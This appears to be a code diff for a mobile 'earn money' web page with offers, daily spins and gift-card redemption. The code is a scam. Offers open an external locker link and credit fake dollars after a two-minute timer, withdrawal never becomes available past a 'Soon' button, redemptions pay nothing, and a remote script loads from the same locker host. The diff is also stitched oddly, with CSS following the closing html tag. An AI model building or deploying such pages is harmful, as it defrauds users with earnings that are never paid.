+function updateOffers() {
+    const completed = Object.values(state.offerClaimed).filter(v => v).length;
+    document.getElementById('tasksDone').textContent = completed;
+    document.getElementById('progressBar').style.width = (completed / 3 * 100) + '%';
+    
+    [1, 2, 3].forEach(n => {
+        const el = document.getElementById('offer' + n);
+        if (!el) return;
+        
+        if (state.offerClaimed[n]) {
+            el.className = 'offer-card completed';
+            el.innerHTML = '<div style="text-align:center;color:#10b981;padding:20px;"><i class="fas fa-check-circle" style="font-size:2.5rem;"></i><div style="margin-top:10px;font-weight:700;font-size:1.1rem;">Completed!</div></div>';
+        } else if (state.offers[n]) {
+            el.className = 'offer-card active';
+            el.innerHTML = `
+                <div style="text-align:center;padding:10px;">
+                    <i class="fas fa-gift" style="font-size:2rem;color:#10b981;margin-bottom:10px;"></i>
+                    <div style="font-weight:700;font-size:1.2rem;margin-bottom:5px;">$${n === 1 ? '5' : n === 2 ? '10' : '15'} Ready!</div>
+                    <button class="btn-primary" style="max-width:200px;margin-top:10px;" onclick="claimOffer(${n})">
+                        <i class="fas fa-download"></i> Claim Now
+                    </button>
+                </div>
+            `;
+        } else if (n === 1 || state.offers[n-1]) {
+            el.className = 'offer-card active';
+        } else {
+            el.className = 'offer-card locked';
+        }
+    });
+}
+
+document.getElementById('offer1').addEventListener('click', () => startOffer(1));
+document.getElementById('offer2').addEventListener('click', () => { if (state.offers[1] || state.offerClaimed[1]) startOffer(2); });
+document.getElementById('offer3').addEventListener('click', () => { if (state.offers[2] || state.offerClaimed[2]) startOffer(3); });
+
+function startOffer(num) {
+    if (state.offers[num] || state.offerClaimed[num]) return;
+    
+    state.currentOffer = num;
+    
+    // Open offer link
+    window.open('https://lockedpage1.website/cl/i/mgk4r5', '_blank');
+    
+    // Show timer modal
+    document.getElementById('timerModal').classList.add('show');
+    
+    // 2 minute timer (120 seconds)
+    let timeLeft = 120;
+    const modal = document.getElementById('timerModal');
+    
+    const timer = setInterval(() => {
+        if (!modal.classList.contains('show')) {
+            clearInterval(timer);
+            return;
+        }
+        
+        timeLeft--;
+        
+        if (timeLeft <= 0) {
+            clearInterval(timer);
+            completeOffer(num);
+        }
+    }, 1000);
+}
+
+function completeOffer(num) {
+    closeModal('timerModal');
+    state.offers[num] = true;
+    save();
+    
+    const reward = num === 1 ? 5 : num === 2 ? 10 : 15;
+    document.getElementById('claimAmount').textContent = reward;
+    document.getElementById('claimModal').classList.add('show');
+}
+
+function claimOffer(num) {
+    const reward = num === 1 ? 5 : num === 2 ? 10 : 15;
+    state.balance += reward;
+    state.earned += reward;
+    state.offerClaimed[num] = true;
+    
+    // Check if all offers completed and $50+ earned
+    checkWithdrawalUnlock();
+    
+    save();
+    closeModal('claimModal');
+    showToast('+$' + reward + ' Claimed!', 'success');
+    updateOffers();
+    updateUI();
+}
+
+document.getElementById('claimBtn').addEventListener('click', function() {
+    claimOffer(state.currentOffer);
+});
+
+// Check if withdrawal should be unlocked
+function checkWithdrawalUnlock() {
+    const age = (Date.now() - new Date(state.created)) / (1000 * 60 * 60 * 24);
+    const completedOffers = Object.values(state.offerClaimed).filter(v => v).length;
+    
+    if (state.balance >= 50 && completedOffers >= 3 && age >= 7) {
+        state.withdrawalUnlocked = true;
+        save();
+    }
+}
+
+// Check and display withdrawal status
+function checkWithdrawalStatus() {
+    const age = (Date.now() - new Date(state.created)) / (1000 * 60 * 60 * 24);
+    const completedOffers = Object.values(state.offerClaimed).filter(v => v).length;
+    const withdrawContainer = document.getElementById('withdrawContainer');
+    const comingSoonBox = document.getElementById('comingSoonBox');
+    const requirementsText = document.getElementById('requirementsText');
+    
+    // Check if newly unlocked
+    if (state.balance >= 50 && completedOffers >= 3 && age >= 7) {
+        // Show coming soon
+        withdrawContainer.innerHTML = `
+            <button class="btn-soon" onclick="showComingSoon()">
+                <i class="fas fa-rocket"></i> 
+                Withdrawal 
+                <span class="soon-badge">Soon</span>
+            </button>
+        `;
+        comingSoonBox.style.display = 'block';
+        requirementsText.innerHTML = '<i class="fas fa-check-circle" style="color: #10b981;"></i> All requirements met! Withdrawal preparing...';
+    } else {
+        // Show locked button
+        withdrawContainer.innerHTML = `
+            <button class="btn-primary" id="withdrawBtn" disabled>
+                <i class="fas fa-lock"></i> <span id="withdrawText">Locked</span>
+            </button>
+        `;
+        comingSoonBox.style.display = 'none';
+        
+        // Update locked message
+        const btn = document.getElementById('withdrawBtn');
+        const txt = document.getElementById('withdrawText');
+        
+        let msg = '';
+        if (state.balance < 50) msg = '$' + (50 - state.balance).toFixed(0) + ' more';
+        else if (completedOffers < 3) msg = (3 - completedOffers) + ' offers';
+        else msg = Math.ceil(7 - age) + ' days';
+        txt.textContent = msg;
+    }
+}
+
+function showComingSoon() {
+    document.getElementById('soonModal').classList.add('show');
+}
+
+// SPIN
+document.getElementById('spinBtn').addEventListener('click', function() {
+    if (state.lastSpin) {
+        const last = new Date(state.lastSpin);
+        const now = new Date();
+        if (last.toDateString() === now.toDateString()) {
+            showToast('Already spun today!', 'error');
+            return;
+        }
+    }
+    
+    this.disabled = true;
+    this.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+    
+    setTimeout(() => {
+        const won = Math.floor(Math.random() * 90) + 10;
+        state.coins += won;
+        state.lastSpin = new Date().toISOString();
+        localStorage.setItem('smb_spin', state.lastSpin);
+        
+        this.innerHTML = '<i class="fas fa-check"></i> Done';
+        showToast('You won ' + won + ' coins!', 'success');
+        save();
+        updateUI();
+        startCountdown();
+    }, 1500);
+});
+
+function startCountdown() {
+    const el = document.getElementById('spinTimer');
+    el.style.display = 'block';
+    
+    const update = () => {
+        const now = new Date();
+        const tmr = new Date(now);
+        tmr.setDate(tmr.getDate() + 1);
+        tmr.setHours(0, 0, 0, 0);
+        
+        const diff = tmr - now;
+        const h = Math.floor(diff / 3600000);
+        const m = Math.floor((diff % 3600000) / 60000);
+        const s = Math.floor((diff % 60000) / 1000);
+        
+        el.textContent = `Next spin: ${h}h ${m}m ${s}s`;
+    };
+    
+    update();
+    setInterval(update, 1000);
+}
+
+// REWARDS
+document.getElementById('rew1').addEventListener('click', () => redeem(5000, '$5 PayPal'));
+document.getElementById('rew2').addEventListener('click', () => redeem(8000, '$10 Steam'));
+document.getElementById('rew3').addEventListener('click', () => redeem(15000, '$20 Amazon'));
+document.getElementById('rew4').addEventListener('click', () => redeem(45000, '$50 Visa'));
+
+function redeem(cost, name) {
+    if (state.coins < cost) {
+        showToast('Need ' + (cost - state.coins) + ' more coins!', 'error');
+        return;
+    }
+    if (!confirm('Redeem ' + name + ' for ' + cost + ' coins?')) return;
+    
+    state.coins -= cost;
+    showToast('Redeemed ' + name + '!', 'success');
+    save();
+    updateUI();
+}
+
+// UI UPDATE
+function updateUI() {
+    document.getElementById('headerBalance').textContent = state.balance.toFixed(2);
+    document.getElementById('mainBalance').textContent = state.balance.toFixed(2);
+    document.getElementById('levelDisplay').textContent = state.level;
+    document.getElementById('levelBadge').textContent = state.level;
+    document.getElementById('currentXP').textContent = state.xp.toFixed(2);
+    document.getElementById('targetXP').textContent = state.targetXP.toFixed(2);
+    document.getElementById('xpBar').style.width = Math.min((state.xp / state.targetXP) * 100, 100) + '%';
+    document.getElementById('totalClicks').textContent = state.clicks;
+    document.getElementById('bestDisplay').textContent = '$' + state.best.toFixed(2);
+    document.getElementById('totalEarned').textContent = state.earned.toFixed(2);
+    document.getElementById('coinsDisplay').textContent = state.coins;
+    
+    // Spin button
+    if (state.lastSpin) {
+        const last = new Date(state.lastSpin);
+        const now = new Date();
+        if (last.toDateString() === now.toDateString()) {
+            document.getElementById('spinBtn').disabled = true;
+            document.getElementById('spinBtn').innerHTML = '<i class="fas fa-check"></i> Done';
+            startCountdown();
+        }
+    }
+}
+
+function closeModal(id) {
+    document.getElementById(id).classList.remove('show');
+}
+
+function showToast(msg, type) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.className = 'toast show ' + (type || '');
+    setTimeout(() => t.classList.remove('show'), 2500);
+}
+
+// Init
+updateUI();
+updateOffers();
+checkWithdrawalStatus();
+
+// Prevent zoom
+document.addEventListener('gesturestart', e => e.preventDefault());
+let lastTouchEnd = 0;
+document.addEventListener('touchend', e => {
+    const now = Date.now();
+    if (now - lastTouchEnd <= 300) e.preventDefault();
+    lastTouchEnd = now;
+}, false);
+</script>
+
+<script type="text/javascript" src="https://lockedpage1.website/cp/js/joy6y"></script>
+
+</body>
+</html>            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #3a36e0 0%, #5a56f0 100%);
+            color: white;
+            padding: 12px 16px;
+            padding-top: max(12px, env(safe-area-inset-top));
+            flex-shrink: 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 100;
+        }
+
+        .logo {
+            font-size: 1.2rem;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
         .balance-pill {
             background: rgba(255,255,255,0.2);
             padding: 6px 12px;
@@ -9591,6 +11015,7 @@ document.addEventListener('visibilitychange', () => {
 
 </body>
 </html>
+
 
 
 
